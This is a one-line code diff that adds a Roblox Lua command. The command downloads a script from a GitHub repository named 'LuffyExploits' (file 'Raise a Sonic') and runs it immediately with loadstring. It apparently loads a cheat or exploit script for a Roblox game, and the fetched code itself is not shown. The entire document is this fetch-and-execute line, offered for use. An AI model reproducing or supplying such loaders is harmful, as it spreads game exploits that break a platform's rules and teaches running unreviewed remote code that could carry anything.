@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/RiotDevelopment/LuffyExploits/main/Raise%20a%20Sonic"))();
